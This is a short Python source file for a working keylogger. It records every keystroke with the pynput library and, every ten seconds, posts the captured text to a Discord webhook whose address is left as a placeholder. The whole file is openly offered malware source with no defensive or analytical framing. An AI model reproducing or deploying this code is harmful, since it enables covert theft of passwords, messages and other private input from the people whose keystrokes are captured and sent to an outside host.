import pynput.keyboard
import requests
import threading

log = ""
webhook_url = "YOUR_DISCORD_WEBHOOK"

def callback_function(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" {str(key)} "

def send_log_to_discord():
    global log
    global webhook_url
    if log:
        payload = {
            "content": log
        }
        try:
            requests.post(webhook_url, json=payload)
        except Exception as e:
            print("Sending error:", e)
        log = ""
    timer = threading.Timer(10, send_log_to_discord) ## Change time
    timer.start()

send_log_to_discord()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    keylogger_listener.join()
